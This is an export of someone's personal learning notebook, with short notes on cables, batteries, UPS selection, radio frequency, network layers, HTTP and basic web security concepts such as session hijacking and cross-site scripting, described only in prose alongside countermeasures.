<!-- LLM PROMPT: This document contains all notes from an Emanote notebook.
Each note is separated by '===' delimiters and includes metadata headers.
- Source: The original file path in the notebook
- URL: The full URL where this note can be accessed
- Title: The note's title
- Wikilinks: All possible ways to reference this note using [[wikilink]] syntax

When referencing notes, you can use any of the wikilinks provided.
The base URL is: 
-->

<!-- Source: computing.md -->
<!-- URL: /computing -->
<!-- Title: Computing -->
<!-- Wikilinks: [[computing]] -->

---
date: 2020-08-02
---

# Computing

> The discipline of computing is the systematic study of algorithmic processes that describe and transform information: their theory, analysis, design, efficiency, implementation, and application. The fundamental question underlying all computing is "What can be (efficiently) automated?"
> <footer class="">— <cite><a href="https://web.archive.org/web/20110928184550/http://cs.gmu.edu/cne/pjd/GP/CompDisc.pdf">Computing as a Discipline</a></cite>, 1989</footer>

* [[hardware]]#
* [[software]]#
* [[network]]#
* [[security]]#


===

<!-- Source: computing/hardware.md -->
<!-- URL: /computing/hardware -->
<!-- Title: Hardware -->
<!-- Wikilinks: [[computing/hardware]], [[hardware]] -->

---
date: 2020-08-03
---

# Hardware

## Portals

* [[lithium-ion-battery]]#
* [[cheap-audio-system]]#
* [[hdmi-cable]]#
* [[select-ups]]#
* [[video-calibration]]#
* [[how-to-coil-cables-the-over-under-technique]]#
* [[radio-frequency-explained]]#


===

<!-- Source: computing/hardware/hdmi-cable.md -->
<!-- URL: /computing/hardware/hdmi-cable -->
<!-- Title: HDMI Cable -->
<!-- Wikilinks: [[computing/hardware/hdmi-cable]], [[hardware/hdmi-cable]], [[hdmi-cable]] -->

---
date: 2020-08-06
---

# HDMI Cable

The other day I was looking for a HDMI cable to connect a laptop and a monitor. Although the standard has been there for years already, I never had to actually buy a cable before, therefore I didn't know anything about it.

Turns out, there are a lot of expensive scam (like with Ethernet cable category): a HDMI cable eieither work or it does not. More expensive mostly doesn't correlate with better quality[^1].


> The fact is, HDMI is digital, meaning you either get the feed or you don’t. High prices and gimmicks like gold-plating don’t affect 1s and 0s.
> <footer class="">—Seth Porges <cite><a href="https://www.popularmechanics.com/technology/gadgets/reviews/a2347/4235717/">Brand-Name HDMI Cables: Are They Worth It?</a></cite>, Jan 1, 2008</footer>

As shown by this picture[^2], it's pretty clear when a HDMI cable is faulty:

![Example of bad HDMI cable](./static/bad_hdmi_cable.jpeg)


Basically, the main (and shall I say only) factor for choosing a HDMI cable is its length: longer means more attenuation of the signal. This is true above 7.5 meters. In that case a more expensive cable may be worth it[^3]:.

The next criteria is personal preference: I found out that nylon braided cables are a huge improvement and are much sturdier than the standard rubber or plastic material used in most cables. Fortunately they aren't even more expensive than their plastic counterpart.


[^1]: "Mostly" because some more expensive cable are still a good investment under some circumstances.
[^2]: Sourge: [The Truth vs Hype about Expensive HDMI Cables](https://www.audioholics.com/audio-video-cables/truth-about-expensive-hdmi-cables)
[^3]: In that case I'd probably go with [Blue Jeans Cable](https://www.bluejeanscable.com/store/hdmi-cables/hdmi-cable.htm) which proved itself to be a reliable and trustworthy company.


===

<!-- Source: computing/hardware/how-to-coil-cables-the-over-under-technique.md -->
<!-- URL: /computing/hardware/how-to-coil-cables-the-over-under-technique -->
<!-- Title: How to Coil Cables: The Over Under Technique -->
<!-- Wikilinks: [[computing/hardware/how-to-coil-cables-the-over-under-technique]], [[hardware/how-to-coil-cables-the-over-under-technique]], [[how-to-coil-cables-the-over-under-technique]] -->

---
date: '2020-10-06T16:22:02+0900'
---

# How to Coil Cables: The Over Under Technique

Something to keep in mind to prevent premature use of cable.

<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/cpuutP6Df84" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>


===

<!-- Source: computing/hardware/lithium-ion-battery.md -->
<!-- URL: /computing/hardware/lithium-ion-battery -->
<!-- Title: リチウムイオンバッテリーについて -->
<!-- Wikilinks: [[computing/hardware/lithium-ion-battery]], [[hardware/lithium-ion-battery]], [[lithium-ion-battery]] -->

---
date: 2020-08-03
tags:
  - battery
---

# リチウムイオンバッテリーについて

注:これは2020年に書いたものです。バッテリーの進化によって前提が変わる可能性があります。

リチウムイオンバッテリー搭載のポータブルスピーカーとノートパソコンがありますが、バッテリーの長持ちはどうしたら良いか調べました。

まず、バッテリーは一定のサイクル数(100％のチャージ)という概念があります。ある日40％まで充電し、別の日に充電して60％まで充電した場合、40％＋60％＝100％、つまり1サイクルとなります。

決められたサイクル数を超えるとバッテリーが使えなくなります(突然ではない場合もあります)。サイクル数は製品とメーカーによりますが、基本的に保証期間中に滅びないようになっています。


## バッテリーの長持ち

結論、コンセントの近くで使用するときは、必ずコンセントに挿したままにしておいた方が良いです。


## 簡単な説明

電池のセルには、陽極と陰極の2つの電極があります。好きな電極から嫌いな電極にイオンを移動させることで、電力を電池の中に押し込まれます。イオンが好きなところに戻るため、電力を押し出します。

バッテリーがほぼ満タン、もしくはほぼ空になっているということは、電極の片方がほぼ満タンになっていて、イオンがたむろする快適な空間を見つけるのが難しいというイメージです。彼らは熱くなり、煩わしくなり、場所をぐちゃぐちゃにしてしまいます。イオンが暴れて電極を破壊したり、電極の間の物を破壊したりします。そうなると、バッテリーはもう動かなくなります。

なお、現代のバッテリーに保護回路があり、バッテリーが空になる前にバッテリーを切断します。逆に、満タンになりそうな状態で充電が遅くなります。完全に満タンになる直前に充電が停止されています。

したがって、電子機器はすでに自動的に過放電または過充電の前に停止します(少なくとも機器のバッテリーが保証期間中に滅びないため)。

壁に接続されているときに機器を使用している場合、バッテリーをまったく使用していない可能性があります。


===

<!-- Source: computing/hardware/radio-frequency-explained.md -->
<!-- URL: /computing/hardware/radio-frequency-explained -->
<!-- Title: Radio Frequency Explained -->
<!-- Wikilinks: [[computing/hardware/radio-frequency-explained]], [[hardware/radio-frequency-explained]], [[radio-frequency-explained]] -->

---
date: '2023-04-15T09:36:08+0900'
---

# Radio Frequency Explained

## What is Radio Frequency?

First we need to define what is **E**lectro **M**agnetic **R**adiation (EMR):
radiation that has both electrical and magnetic properties.

Anytime an electron move, specially in a copper cable,that sends a current in
the copper cable. If the electron move inside the copper cable between two
batteries, the EMR direction will be at 90 degrees of that.

**Note:** in 3 dimension, if we see the copper cable in front of us (poking us
in the eye), EMR would go in all direction at 90 degrees.

EMR radiation has both *electrical* and *magnetic* properties, and requires *no
medium in order to propagate* (even through the vacuum of space, which is why
radio telescope was often used to detect non-natural, extraterrestrial EMR).

EMR has a detectable waveform: it oscillates. The cycling of this waveform is
measured in Hertz.

In conclusion: **radio frequency is the measurement of the oscillation of
EMR**.

### ISM Bands

EMR frequency bands have been given labels. Those assigned by U.S. Federal
Communications Commission are called **ISM Bands**: *unlicensed* **I**ndustrial,
**S**cientific and **M**edical use.

On a scale from 0 Hz to 3000 EHz (ExaHertz), we can find:

-   Extremely Low (ELF) (Audio)
-   Very Low (Audio)
-   Low
-   Medium (AM Broadcast)
-   High (Shortwave Radio)
-   Very High (Broadcast TV)
-   Ultra High, unlicensed ISM bands are between:
    -   902 - 928 MHz
    -   2.4 - 2.5 GHz
-   Super High, Unlicensed National Information Infrastructure (U-NII) ISM bands
    are:
    -   5.15 - 5.35 GHz
    -   5.47 - 5.875 GHz
-   Infrared
-   Visible Light
-   Ultra-Violet
-   X-Rays
-   Gamma Rays

As a rule of thumbs, the faster the frequency (faster the oscillation), the more
data you can encode. This is why newer Wi-Fi standards are being added on the
*Super High* U-NII/ISM frequency range.

There is a downside though: radio frequency as a tendency to attenuate (encoded
data become unrecognizable; like someone speaking closer to you is more audible
than someone speaking far away from you). For Wi-Fi, it means that a device need
to be closer to the emitter in order to receive information without troubles.

Another downside is as anyone can use ISM bands, they tend to be crowded. This
is the case for 2.4 GHz: microwaves would often interfere with Wi-Fi because they
would induce noise in this same frequency.

## Modulation

Radio Frequency (i.e. EMR) has different properties that can be artificially
changed over time to encode data. This process is called **modulation**.

The following properties can be modulated:

-   **Frequency Modulation (FM):** the greater the frequency, the more data can
    be encoded into a Wi-Fi signal
-   **Wavelength:** the distance between two "positives" or two "negatives",
    inversely proportional to frequency
-   **Amplitude Modulation:** the overall strength (or power) of a signal. Note:
    RF amplitude weakens greatly over distance and as it passes through objects
    (this is called *attenuation*)
-   **Phase:** a comparison of the waveform between two RF signals. Two
    identical waveform at comparison time are considered 100% in phase. This
    phase can be intentionally modified to encode data

For newer Wi-Fi versions, all of the modulation above are used in some form to
encode even more data.


===

<!-- Source: computing/hardware/select-ups.md -->
<!-- URL: /computing/hardware/select-ups -->
<!-- Title: 無停電電源装置 (UPS) の選び方 -->
<!-- Wikilinks: [[computing/hardware/select-ups]], [[hardware/select-ups]], [[select-ups]] -->

---
date: 2020-08-06
---

# 無停電電源装置 (UPS) の選び方

大切な電子機器を守りたいなら UPS の設置は必要不可欠だと思います。

残念ながら一般家庭向けの優れた UPS はこの世に少ないもですが、

* 自動電圧調整器(AVR)
* 正弦波
* USB ポート (NUT のため)
* 交換可能な電池

は最低条件だと思います。

そして接続する予定の機器の電力に合わせて出力容量を選びます。


===

<!-- Source: computing/hardware/video-calibration.md -->
<!-- URL: /computing/hardware/video-calibration -->
<!-- Title: Video Calibration -->
<!-- Wikilinks: [[computing/hardware/video-calibration]], [[hardware/video-calibration]], [[video-calibration]] -->

---
date: 2020-08-22T17:17
---

# Video Calibration

Display calibration is optimization of display settings to establish a
standard.

In general we talk about calibring the following:
* Brightness
* Contrast
* Resolution
* Sharpness
* Color Temperatture
* RGB Cuts/Gains
* CMS
* Colorspace


## Why Calibrate?

In order to have a accurate representation of images.


## Calibration of Computer Monitor

Calibration is different for each display type. I am more concerned with
computer monitors.

However, to perform a calibration right, one need a specialized device. I don't
have one at time and don't intend to buy one in a near future.


## Sources

[Calibration 101 Webinar – Why Calibrate](https://www.youtube.com/watch?v=UF7PuHQtt9o)

[Permanent Link to Calibrating Profiling a Monitor in Linux Using a Datacolor
Spyder 4](http://lifeofageekadmin.com/calibrating-profiling-monitor-linux-using-datacolor-spyder-4/)


===

<!-- Source: computing/network.md -->
<!-- URL: /computing/network -->
<!-- Title: Network -->
<!-- Wikilinks: [[computing/network]], [[network]] -->

---
date: 2020-08-02
---

# Network

## Fundations

* [[networking-foundations]]#
* [[protocols]]#
* [[networking-models]]#

## Other

* [[vdsl]]#
* [[ethernet-cable-category-pitfalls]]#


===

<!-- Source: computing/network/application-layer.md -->
<!-- URL: /computing/network/application-layer -->
<!-- Title: Application Layer -->
<!-- Wikilinks: [[computing/network/application-layer]], [[network/application-layer]], [[application-layer]] -->

---
date: 2021-09-15T08:48
---

# Application Layer

Application layer protocols are the protocols which applications most
directly interacts with.

Protocols on this layer rely on the protocols on layers below to ensure
messages get to their destination. What they focus on is the **structure of
that message** and the **data that it contain**.

Application layer protocols can be thought of as a set of rules to define
how applications talk to each other. Different type of application will
have different rules, which means there are a lot of protocol on this
layer. For example. the rules of communication for an email server is
different than the rules of communication for a web server.

From the most popular protocols we can cite SMTP, FTP or the
[[http-protocol]]#.


===

<!-- Source: computing/network/encapsulation.md -->
<!-- URL: /computing/network/encapsulation -->
<!-- Title: Encapsulation -->
<!-- Wikilinks: [[computing/network/encapsulation]], [[network/encapsulation]], [[encapsulation]] -->

---
date: 2021-06-07T21:17
---

# Encapsulation

**Encapsulation** is hiding piece of functionality and making it unavailable to
the rest of the code base.

Encapsulation is used to restrict direct access to the states of an object.

To access and modify the state of an object, publicly accessible methods
(generally _getter_ and _setter_ methods) are provided.

```ruby
class Customer
  def initialize(id, n, addr)
    @id = id
    @name = n
    @address = addr
  end

  def display_details
    puts "Customer id: #{id}"
    puts "Customer name: #{name}"
    puts "Customer address: #{address}"
  end

  private

  attr_reader :id, :name, :address
end

josh = Customer.new('0001', 'Josh', '26 ave Grand Marnier')
josh.display_details
```

In the example above, the states of the object `josh` instantiated from
`Customer` class are private, i.e., cannot be accessed directly. However,
the object has one behavior publicly available: instance method
`display_details`.

## Advantages of Encapsulation

- **Data Hiding**: from outside, the implementation of the class is hidden
  and code only interacts with setter/getter methods.
- **Reusability**: as long as the public interfaces are still public, the
  implementation is of no concern and therfore, the reusability is
  improved.
- **Testing**: encapsulated codes are easy to test with unit testing.


===

<!-- Source: computing/network/ethernet-cable-category-pitfalls.md -->
<!-- URL: /computing/network/ethernet-cable-category-pitfalls -->
<!-- Title: Ethernet Cable Category Pitfalls -->
<!-- Wikilinks: [[computing/network/ethernet-cable-category-pitfalls]], [[network/ethernet-cable-category-pitfalls]], [[ethernet-cable-category-pitfalls]] -->

---
date: 2020-08-17
tags:
- cable
---

# Ethernet Cable Category Pitfalls

{.ui .info .message}
This note concerns private customers only, not professionals.


While Wi-Fi works well most of the time, working from home and frequent video chat are better handled by Ethernet cables which offer a lower latency, no dropped connections due to interference, and are just—at least theoretically—plain faster than wireless connections[^1].


Ethernet cables have different categories described in the table below ([source](https://www.digitaltrends.com/computing/different-types-of-ethernet-cables-explained/)).

<table class="ui celled table">
  <thead>
    <tr>
      <th>Category</th>
      <th>Shielding</th>
      <th>Max Transmission Speed (at 100 meters)</th>
      <th>Max Bandwidth</th>
     </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Category">Cat 3</td>
      <td data-label="Shielding">Unshielded</td>
      <td data-label="Max Transmission Speed (at 100 meters)">10 Mbps</td>
      <td data-label="Max Bandwidth">16 MHz</td>
    </tr>
    <tr>
      <td data-label="Category">Cat 5</td>
      <td data-label="Shielding">Unshielded</td>
      <td data-label="Max Transmission Speed (at 100 meters)">10/100 Mbps</td>
      <td data-label="Max Bandwidth">100 MHz</td>
    </tr>
    <tr>
      <td data-label="Category">Cat 5e</td>
      <td data-label="Shielding">Unshielded</td>
      <td data-label="Max Transmission Speed (at 100 meters)">1 Gbps</td>
      <td data-label="Max Bandwidth">100 MHz</td>
    </tr>
		<tr>
			<td data-label="Category">Cat 6</td>
      <td data-label="Shielding">Shielded or Unshielded</td>
      <td data-label="Max Transmission Speed (at 100 meters)">1 Gbps</td>
      <td data-label="Max Bandwidth">250 MHz</td>
		</tr>
		<tr>
			<td data-label="Category">Cat 6a</td>
      <td data-label="Shielding">Shielded</td>
      <td data-label="Max Transmission Speed (at 100 meters)">10 Gbps</td>
      <td data-label="Max Bandwidth">500 MHz</td>
		</tr>
		<tr>
			<td data-label="Category">Cat 7</td>
      <td data-label="Shielding">Shielded</td>
      <td data-label="Max Transmission Speed (at 100 meters)">10 Gbps</td>
      <td data-label="Max Bandwidth">600 MHz</td>
		</tr>
		<tr>
			<td data-label="Category">Cat 7a</td>
			<td data-label="Shielding">Shielded</td>
      <td data-label="Max Transmission Speed (at 100 meters)">10 Gbps</td>
      <td data-label="Max Bandwidth">1 Ghz</td>
		</tr>
		<tr>
			<td data-label="Category">Cat 8</td>
			<td data-label="Shielding">Shielded</td>
      <td data-label="Max Transmission Speed (at 100 meters)">40 Gbps</td>
      <td data-label="Max Bandwidth">1 Ghz</td>
		</tr>
  </tbody>
</table>


My first thought was "the more, the better" but on closer inspection, anything with a transmission speed above 1 Gbps seems indigenous when most (all?) home customer Ethernet cards are gigabit card only.

Maybe there will be +10 Gbps card in a near future and you want to be prepare for it. However Category 7 and 7a are not recognized by the TIA/EIA-568 standard and are better avoided to prevent future problems.

As for now, Cat 6a is what most if not all home users should be using.


## Standards are loosely respected

Unfortunately, according to [tests by Blue Jeans Cable](https://www.bluejeanscable.com/articles/is-your-cat6-a-dog.htm), compliance is loosely respected and your newly bought Cat 6 may only by as good (as bad?) as a Cat5a or below.

Again, unfortunately there is no easy way to test cables without specialized equipment that costs anywhere from $1,000 to $10,000.

It seems that private users can only either suck it up and hope for the best or buy from a reputable (and a little bit pricey) manufacturer like Blue Jeans Cable[^2].


[^1]: 802.11ac standard's max connection speed is 1Gbps under best conditions, which is rarely met in real-world.
[^2]:I picked then up because they are highly regarded by audiophile folks—a bunch known for digesting cable specifications and being picky about it—as a trustworthy, no bullshit company. I am of course open to other suggestions.


===

<!-- Source: computing/network/http-protocol.md -->
<!-- URL: /computing/network/http-protocol -->
<!-- Title: HyperText Transfer Protocol (HTTP) -->
<!-- Wikilinks: [[computing/network/http-protocol]], [[network/http-protocol]], [[http-protocol]] -->

---
date: 2021-09-15T08:58
---

# HyperText Transfer Protocol (HTTP)

**HyperText Transfer Protocol** (HTTP) defines how resources on the _web_
are transferred between applications.

The web, or World Wide Web, is a **service** that can be accessed _via_
Internet. It's a vast system of resources navigable by means of URL
(Uniform Resource Locator). Applications primary interact with the
resources which make up the web using **HTTP**.

HTTP is called a **request response protocol** because it follow the
following model: a client make a **request** to a server and waits for a
**response**.

Both request and response are text messages (or strings) that follow a
standard format so that other machine can understand and interpret them. We
often call the result of the response **resources**.

## Statelessness

A **stateless** protocol is a protocol where each request/response pair are
completely independent of the previous one. HTTP _is_ a stateless protocol.

In HTTP context, it means the server does not need to know the last good
state. If a request break, no cleanup is done; this make HTTP resilient,
distributed and hard to control, but also difficult to build stateful
application upon.

See [[stateful-web-app]]# for a way to make sateteful web applications out
of HTTP.

## Difference Between URI and URL

A web page address such as
`https://www.eff.org/pages/surveillance-self-defense` is known as a
**U**niform **R**esource **L**ocator, or **URL**. It's like a physical
address but for visiting web page.

A **U**niform **R**esource **I**dentifier, or **URI**, on the other hand
specifies how resources are located. URL is the most frequently used part
of the general concept of URI.

This is confusing, however, and the RFCs regarding the two terms are of no
help. In short, though:

- URI = URL + URN
- URI identifies
- URL locates
- Locators (URL) are also identifiers (URI) but not necessary the other way
around

The terms are [not interchangeable](https://stackoverflow.com/a/1984225)
but according to a [W3C
Note](https://www.w3.org/TR/uri-clarification/#contemporary) we should use
URI when speaking about **scheme** and URL when speaking precisely about
web page addresses.

See also [this video](https://www.youtube.com/watch?v=if0pzXWZOfY) for more
information and examples.

## URL Components

Let's analyze the following URL and its components:
`https://www.eff.org:443/updates?type=case`

- `https`: the **scheme**. Written before a colon and two forward slashes
(`://`). It tells the web client which protocol to use to access the
resource. Often referred to as the _protocol_ which is not totally wrong,
but the correct term as an URL component is _scheme_.
- `www.eff.org`: the **host**. Where the resources is at. Different from
the _domain_, although this example uses a domain and a subdomain.
- `:443`: the **port**. Can be omitted if it's one of the default one (`80`
for HTTP and `443` for HTTPS, like in this case)
- `/updates`: the **path**. Shows which resource within the host is being
requested. Optional to make a complete HTTP request.
- `?type=case`: the **query string** made up of **query parameters**. Used
to send data to the server. Also optional.

{.ui .message .info}
When accessing the URL above, we are redirected to
`https://www.eff.org/cases`. This has nothing to do with how URL works;
it's simply the result of what the framework for this particular website
decides to send back.

Unless something else is specified, port `80` will be assumed for every
HTTP requests and port `443` will be assumed for every HTTPS request.

### Query Strings/Parameters

Assume the following URL:
`https://www.eff.org/events/list?type=event&offset=0`

Let's break the query string down:

<table class="ui celled table">
  <thead>
    <tr>
      <th>Query String Component</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Query String Component">?</td>
      <td data-label="Description">Marks the start of the query string</td>
    </tr>
    <tr>
      <td data-label="Query String Component">type=event</td>
      <td data-label="Description">Parameter name/value pair</td>
    </tr>
    <tr>
      <td data-label="Query String Component">&</td>
      <td data-label="Description">Marks where another parameter will be added</td>
    </tr>
    <tr>
      <td data-label="Query String Component">offset=0</td>
      <td data-label="Description">Another parameter name/value pair</td>
    </tr>
  </tbody>
</table>

Query strings are passed in through the URL. For this reason they are
**only used in HTTP GET requests**. As they are visible in the URL, they
should not be used for sensitive information such as username and password.
Note also that query strings have a maximum length and space/special
characters can't be used (they need to be URL/percentage encoded).

### URL Encoding

URL can only accept characters from the standard 128-character ASCII
character set. Everything else need to be encoded. URL encoding replace
non-conforming characters with a `%` symbol followed by two hexadecimal
digits that represent the [ASCII Code](https://www.asciitable.com/) of the
character.

Other than characters that are not in the ASCII character set, those
considered unsafe, like characters used to write HTML tag `<` and `>`
should also be encoded. Characters reserved for URL scheme that we already
saw earlier, and characters for the query strings should also be encoded.

## HTTP Request Method

HTTP Request Methods are a _verb_ used to tell the server what action to
perform on a resource.

### GET Requests

`GET` requests are the most common requests. When entering an address in a
browser bar or clicking a link, the browser is making a `GET` request on
our behalf.

The response from a `GET` request can be anything. If it's HTML and that
HTML references other resources, the browser will automatically request
those resources (a pure HTTP tool like `curl` will not).

### POST Requests

`GET` are great to retrieve or ask for information from a server, but to
send or submit data we often use `POST`.

`POST` is often used to send information through a form. Though most `POST`
request could be done with `GET`, it is not wise to use the later with
sensitive information as it will reveal the information in the query
parameter. `POST` can also send bigger files, which `GET` cannot because of
the size limitation of its requests.

## Security

See [[http-security]]#.


===

<!-- Source: computing/network/http-security.md -->
<!-- URL: /computing/network/http-security -->
<!-- Title: HTTP Security -->
<!-- Wikilinks: [[computing/network/http-security]], [[network/http-security]], [[http-security]] -->

---
date: 2021-10-24T14:57
---

# HTTP Security

## Secure HTTP (HTTPS)

Requests and responses between client and server are sent as strings. This
mean someone on the same network, using _packet sniffing_ techniques could
read the messages sent back and forth. By copying the session id, someone
could craft a request and pose as someone else without having to know the
account's username and password.

With HTTPS, every request/response is encrypted before reaching the
network. _Packet sniffing_ is still possible but the messages being
encrypted, it is rendered useless.

HTTPS uses a cryptographic protocol called TLS for Transport Layer
Security. Earlier versions used SSL (Secure Sockets Layer) and some people
still refer to TLS as SSL. TLS is the correct term though.

The most recent version of TLS is TLS 1.3.

### Transport Layer Security Protocol

TLS provides three important security services:

- [[tls-encryption]]#: encode messages so that only authorized people can
decode
them
- [[tls-authentication]]#: verify the identity of a party in a message
exchange
- **Integrity**: detect whether the message has been altered/interfered
with (see [[message-authentication-code]]#)

### TLS Handshake

TLS Handshake process is used to:

- Agree on which version of TLS to use between the client and server in
establishing a secure connection
- Agree on the algorithms to be included in the cipher suite
- Exchange the symmetric keys that will be used for message encryption

One should be aware that this overhead as an impact on performance: it adds
up to two round-trip of latency in addition to the TCP Handshake.

A more detailed explanation of the TLS Handshake can be seen here:
[[tls-handshake]]#.

## Same-Origin Policy

Same-origin policy restrict and un-restrict interaction base on the
**origin** of the interaction. It is an important policy to guard against
session hijacking.

The _origin_ consists of three elements of the URL:

- The **scheme** (http, https...)
- The **hostname**
- The **port**

Same-origin policy typically restricts cross-origin requests where
resources are being accessed programmatically using APIs. Linking,
redirects and form submissions to different origins are typically allowed.

Same-origin policy is a great layer of security but may cause problem for
developers with a legitimate need for cross-origin requests. This problem
can be dealt with user *CORS** for **C**ross-**O**rigin **R**essource
**S**haring.

CORS works by adding a new HTTP header of a list of allowed specified
origins.

## Session Hijacking

Session hijacking is when an attacker gets a hold of someone else's
session id. In this case, the attacker can access the website as the
victim, without having to get hold of username and password, and without
the user's knowing.

Some countermeasures includes:

- Resetting sessions by issuing a new session id and invalidating the
previous one. Often used when a user access sensitive part of a website
(credit card, account information etc.)
- Setting an expiration time on sessions: arbitrary time after which the
session is forced to reset
- HTTPS to reduce the chance of someone stealing a session id

## Cross-Site Scripting (XSS)

An attack in which a user-generated HTML or JavaScript input is executed as
is by the website. In other word: the browser will _interpret_ the given
code and _execute_ it.

Using maliciously crafted JavaScript, an attacker could inject code that
reads the session id of the user or inject a malicious form that sends the
information back to the attacker.

Some countermeasures includes:

- Always **sanitize** user inputs and disallow HTML/JavaScript and prefer
safer format like Markdown.
- Escape user inputs when displaying it so that the browser does not
interpret it

{.ui .memo .info}
Escaping a character means replacing it with a combination of ASCII
characters. This lets the client (browser) knows to display the characters
as is instead of processing it. See
[HTML entities](https://entitycode.com/#math-content)


===

<!-- Source: computing/network/internet-network-layer.md -->
<!-- URL: /computing/network/internet-network-layer -->
<!-- Title: Internet/Network Layer -->
<!-- Wikilinks: [[computing/network/internet-network-layer]], [[network/internet-network-layer]], [[internet-network-layer]] -->

---
date: 2021-09-10T09:07
---

# Internet/Network Layer

The primary function of protocols at this layer is to facilitate
communication between hosts on different networks.

The predominant protocol used at this layer is the **Internet Protocol**
(IP). Currently, two versions are in use: **IPv4** and **IPv6**. Despite
the differences, their primary features are the same:

- **Routing** via IP addressing
- **Encapsulation** of data into packets

## Data Packet

The Protocol Data Unit (PDU) within the IP protocol is called a **packet**.
It contains a Data Payload and a Header. Of course, the Data Payload of an
IP packet is the PDU from the layer above it (the Transport layer). It is
generally, although not always, a TCP segment or UDP datagram.

The header is split into logical fields determined by the set size of each
field in bits, and the order within the packet.

{.ui .message .info}
The purpose of the Layer 3 header is to get the data from end to end.

There are fourteen fields in the header. The most important ones are:

- **Version**: IPv4 or IPv6
- **ID, Flags, Fragment Offset**: used to reassemble a packet in the
correct order when the Transport layer PDU is too large to be sent at once.
- **TTL**: Time To Live value. Indicates the maximum _hops_ a packet can
take before being dropped. At each network hops the TTL value is
decremented by one.
- **Protocol**: protocol used for the Data Payload: TCP, UDP etc.
- **Checksum**: error checking value. The packet is dropped if the
calculated value doesn't match the given one; this may indicate corruption
somewhere on the line. IP does _not_ manage retransmission of dropped
packets.
- **Source Address**: the 32-bit IP address of the sender of the packet
- **Destination Address**: the 32-bit IP address of the intended recipient
of the packet

## IP Addresses

IP addresses are logical: they are not, like the [[mac-addresses]], tied to
a specific device but assigned as required. The assigned IP address is
whitin a _range_ of available addresses, generally given automatically by a
Dynamic Host Configuration Protocol (DHCP) server or router.

## ARP Table

An ARP Table is a mapping of an IP address to a MAC address. All Layer 3
(this layer) devices will have an ARP table.


===

<!-- Source: computing/network/link-data-link-layer.md -->
<!-- URL: /computing/network/link-data-link-layer -->
<!-- Title: Link/Data Link Layer -->
<!-- Wikilinks: [[computing/network/link-data-link-layer]], [[network/link-data-link-layer]], [[link-data-link-layer]] -->

---
date: 2021-09-01T08:22
---

# Link/Data Link Layer

This layer concerns itself with identifying the device to which we want to
send the data to. The devices are any tangible devices found on the
physical network such as computers, switches, and routers.

This layer works like an **interface** between the physical layer and the
logical layer above it.

The most commonly used and most famous protocol on this layer is the
**Ethernet** protocol, governed by the [IEEE
standards](https://standards.ieee.org/standard/802_3-2018.html).

Ethernet works using concepts called **framing** and **addressing**. We
will review both.

## Ethernet Frames

Ethernet Frames are a Protocol Data Unit (see #[[networking-models]]) which
encapsulate data from the Internet/Network layer above.

{.ui .message .info}
The Link/Data Link layer is the lowest layer at which encapsulation takes
place.

On the physical layer, the data is a stream of bits without logical
structure. An Ethernet Frame adds this missing structure to this binary
data. The structure defines which bits are _data payload_ and which are
_metadata_ (header or trailer/footer).

{.ui .message .info}
The purpose of the Layer 2 header is to get the data from hop to hop.

Ethernet-compliant device can identify the different parts of a frame
because each "fields" of data have a specific lengths in bytes, and appear
in an order. The frame described below follows the IEEE 802.3 Ethernet
standard.

```txt
+---------------+----------+--------+------+------+---------+--------+-----+
|               |          |        |      |      |         |        |     |
|  Destination  |  Source  |        |      |      |         |        |     |
|      MAC      |   MAC    | Length | DSAP | SSAP | Control |  Data  | FCS |
|  Destination  |  Source  |        |      |      |         |        |     |
|               |          |        |      |      |         |        |     |
+---------------+----------+--------+------+------+---------+--------+-----+
 ^                                                         ^ ^      ^ ^   ^
 |                                                         | |      | |   |
  \__________________________+____________________________/   \____/   \_/
                             |                                  |       |
                        Frame header                       Data Payload |
                                                                        |
                                                            Frame footer/trailer
```

Note that the fields length are not at scale. _Destination_, _Source_ and
_Data_ are normaly longer than the other field.

Here is a rundown of all the field:

- **Preamble and Start of Frame Delimiter (SFD):** Not actual part of the
frame but sent prior to the frame to let the receiving device to exoect
frane comming next.
- **Source and Destination MAC address:** Six bytes (48 bits) long fields
each containing respectively the MAC address of the device that created the
frame (can vary depending on where the data travels) and the MAC address of
the device the data is ultimately intended. See [[mac-addresses]]#.
- **Length:** Two bytes (16 bits) length to indicate the size of the Data
Payload
- **DSAP, SSAP, Control:** One byte (8 bits) length each, used to identify
the Network Protocol used for the Data Payload and additional information
about the communication mode for the frame.
- **Data Payload:** Between 42 and 1497 bytes in length, contains the data
for the PDU from the layer above.
- **Frame Check Sequence (FCS):** The final four bytes (32 bits) is a
checksum generated by the device which created the frame. It is used by the
receiving end to check if even one bit of the frame data was modified/lost
along the way. If the check don't match, the frame is dropped. Note that
**Ethernet doesn't implement a retransmission functionality for dropped
frames.** This is the responsability of higher level protocols to manage
retransmission (if this is even a requirement of the protocol).
- **Interframe Gap (IFG):** Like the Preamble/SFD, this is not part of the
frame. This is a brief pause between each frame transmission to let the
receiver prepare for the next frame. The length varies according to the
capability of the Ethernet connection but it contributes to the delay
(latency, see [[physical-network]])

{.ui .message .info}
Developer should mainly concern themselves with **Source and Destination
MAC address** being used to direct the frame between network devices and
**Data Payload** being used as an encapsulation mechanism for the layer
above.


===

<!-- Source: computing/network/mac-addresses.md -->
<!-- URL: /computing/network/mac-addresses -->
<!-- Title: MAC Addresses -->
<!-- Wikilinks: [[computing/network/mac-addresses]], [[network/mac-addresses]], [[mac-addresses]] -->

---
date: 2021-09-01T10:11
---

# MAC Addresses

A MAC address is unique address assigned to a network device (like a NIC,
or Network Interface Card) during manufacturing. The address is supposed to
be linked to the specific physical device and usually doesn't change.
Network hardware manufacturers are assigned a ranges of addresses which
they have to use.

For this reason, MAc addresses are sometimes referred to as _physical
address_ or _burned-in address_.

A MAC address is a sequence of six, two-digit hexadecimal numbers:
`00:1B:44:11:3A:B7`.

MAC address lets computer on a local network know if the data transmited is
intended to them or not.

## CSMA: Carrier Sense Multiple Access

CSMA is the approach of sending data over a _carrier_, in this case any
shared transmission medium such as copper wire for Ethernet or air
carrying radio waves for WiFi to any connected devices in the local
network. Device will know if the message is addressed to them by checking
the [[mac-addresses]] included in the header with their own.

## Collision

As network traffic increases, so does the probability of two computers to
attempt to write data at the same time. This is called a _collision_. The
data gets garbled up like two people trying to speak on the phone at the
same time.

Computers can detect the collisions by listening to the signal on the wire
but this is not scalable as each computer will either wait for a carrier to
go silent while other will try to jump in during any pause, leading to more
collision.

